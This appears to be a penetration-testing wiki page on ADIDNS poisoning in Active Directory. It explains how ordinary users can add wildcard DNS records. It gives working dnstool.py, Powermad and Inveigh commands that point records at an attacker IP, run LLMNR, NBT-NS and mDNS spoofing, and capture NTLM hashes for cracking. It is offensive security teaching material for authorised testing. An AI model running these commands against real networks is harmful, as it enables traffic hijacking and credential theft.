---
authors: ShutdownRepo
category: ad
---

# ADIDNS poisoning

## Theory

In order to function properly, Active Directory services need DNS. In that matter, Active Directory Domain Services (AD-DS) offer an integrated storage and replication service for DNS records. This is called Active Directory Integrated DNS (ADIDNS).

Just like any other domain name resolution spoofing attack, if an attacker is able to resolve requests with an arbitrary IP address, traffic gets hijacked, the attacker becomes a Man-in-the-Middle and further attacks can be operated.

Since ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, attackers can leverage that and hijack traffic.

ADIDNS zones can be remotely edited

* with dynamic updates (a DNS specific protocol used by machine accounts to add and update their own DNS records). Users can create records if they don't exist, and they will have full control over it. By default, users that don't own a record will not be able to edit it, or to add another one with the same name, even if the type is different (A, AAAA, CNAME, MX, and so on).
* by using LDAP to create dnsNode objects. While dynamic updates can't be used to inject a wildcard DNS record, LDAP can be (only if the record doesn't already exist, which is the case by default).

### Wildcard records & WINS

> Wildcard records allow DNS to function in a very similar fashion to LLMNR/NBNS spoofing. Once you create a wildcard record, the DNS server will use the record to answer name requests that do not explicitly match records contained in the zone. ([source](https://blog.netspi.com/exploiting-adidns/#wildcard))

:bulb: In some scenarios, adding a wildcard record to the proper ADIDNS zone won't work. This is usually due to the WINS forward lookup being enabled on that zone. WINS forward lookup makes the DNS server send a NBT-NS Query Request to a predefined WINS server when it receives an address record query for which it doesn't know the answer. In short, it serves the same purpose as the wildcard record. This feature needs to be disabled for the wildcard record to be used.

![Domain Controller > DNS Manager > zone properties > WINS](<./assets/WINS Lookup.png>)

## Practice

### WINS forward lookup

::: tabs

=== UNIX-like

The state of WINS forward lookup can be enumerated with [dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) (Python). The entry type 65281 (i.e. "WINS") will exist if WINS forward lookup is enabled.

```bash
dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '@' --action 'query' 'DomainController'
```


=== Windows

The state of WINS forward lookup can be enumerated with [dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) (Python). The entry type 65281 (i.e. "WINS") will exist if WINS forward lookup is enabled.

```powershell
Get-DNSServerResourceRecord -ZoneName "DOMAIN.FQDN" -RRType "WINS"
```

:::


### Manual record manipulation

::: tabs

=== UNIX-like

An awesome Python alternative to Powermad's functions is [dnstool](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py). Theoretically, this script can be used to `add`, `modify`, `query`, `remove`, `resurrect` and `ldapdelete` records in ADIDNS.

```bash
# query a node
dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController

# add a node and attach a record
dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
```


=== Windows

On Windows, the [Powermad ](https://github.com/Kevin-Robertson/Powermad)module can be used to manually add, view, edit, enable, disable or remove records and nodes. In the following examples, the wildcard (`*`) node/record is targeted but the examples should also work with other records (except things like `WPAD` that are in the [GQBL](wpad-spoofing.md#through-adidns-spoofing)).

```bash
# get the value populated in the DNSRecord attribute of a node
Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord

# creates a wildcard record, sets the DNSRecord and DNSTombstoned attributes
New-ADIDNSNode -Tombstone -Verbose -Node * -Data $ATTACKER_IP

# append, populate, or overwrite values in a DNS node attribute
Set-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Value (New-DNSRecordArray -Data $ATTACKER_IP) -Verbose

# a tombstoned record can be turned again into a valid record with the following command
Enable-ADIDNSNode -Node *

# disable (i.e. tombstone) a node
Disable-ADIDNSNode -Node *

# remove a node
Remove-ADIDNSNode -Node *

# check the wildcard record works/resolve a name
Resolve-DnsName NameThatDoesntExist
```

> [!SUCCESS]
> TL; DR: the following command will add a new wildcard record (if it doesn't already exist) with the attacker IP set in the DNSRecord attribute
> 
> ```bash
> New-ADIDNSNode -Tombstone -Verbose -Node * -Data $ATTACKER_IP
> ```

> [!CAUTION]
> Warning: in some environments, the disabling or removal of the records previously created for tests failed. The records were shown as tombstoned or nonexistant when using functions like `Get-ADIDNSNodeOwner`, `Get-ADIDNSNodeAttribute`, and so on. I think it was due to some replication issues.
> 
> However, the DNS Manager console was still showing those records and name resolution was still effective. It will probably stay an unsolved mystery for me, but testers need to keep this in mind when abusing ADIDNS.

More help on usage, support functions, parameters and attacks [here](https://github.com/Kevin-Robertson/Powermad#adidns-functions).

:::


> [!TIP]
> When adding records has no impact on name resolution or when the tools throw errors like `NoSuchObject`, it could be that the DNS zones in use are stored in the legacy `System` partition, or the `ForestDnsZones`, instead of the `DomainDnsZones` one.
> 
> This can be set with the `--legacy` or `--forest` option on dnstool.py, or with the `-Partition` argument for Powermad.

### Dynamic spoofing

Using [Inveigh](https://github.com/Kevin-Robertson/Inveigh) (Powershell), the following command will 

* operate [LLMNR, NBT-NS and mDNS spoofing](llmnr-nbtns-mdns-spoofing.md)
* operate ADIDNS spoofing
 * `combo` looks at LLMNR/NBNS requests and adds a record to DNS if the same request is received from multiple systems
 * `ns` injects an NS record and if needed, a target record. This is primarily for the GQBL bypass for wpad. 
 * `wildcard` injects a wildcard record
* set the threshold at which the combo ADIDNS spoofing mode will take effect
* enable showing NTLM challenge/response captures from machine accounts
* set the Challenge to `1122334455667788` (to [crack NTLM hashes](../credentials/cracking.md#practice) with [crack.sh](https://crack.sh/))

```powershell
Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
```

[This wiki page](https://github.com/Kevin-Robertson/Inveigh/wiki/Basics) can be really useful to help master Inveigh and its support functions

* `Clear-Inveigh` to clear Inveigh's hashtable
* `Get-Inveigh` to get data from Inveigh's hashtable
* `Stop-Inveigh` to stop all running modules
* `Watch-Inveigh` to enable real time console output

## Resources

[https://blog.netspi.com/exploiting-adidns/](https://blog.netspi.com/exploiting-adidns/)

[https://blog.netspi.com/adidns-revisited/](https://blog.netspi.com/adidns-revisited/)

[https://snovvcrash.rocks/2020/12/28/htb-hades.html#spoofing-active-directory-integrated-dns](https://snovvcrash.rocks/2020/12/28/htb-hades.html#spoofing-active-directory-integrated-dns)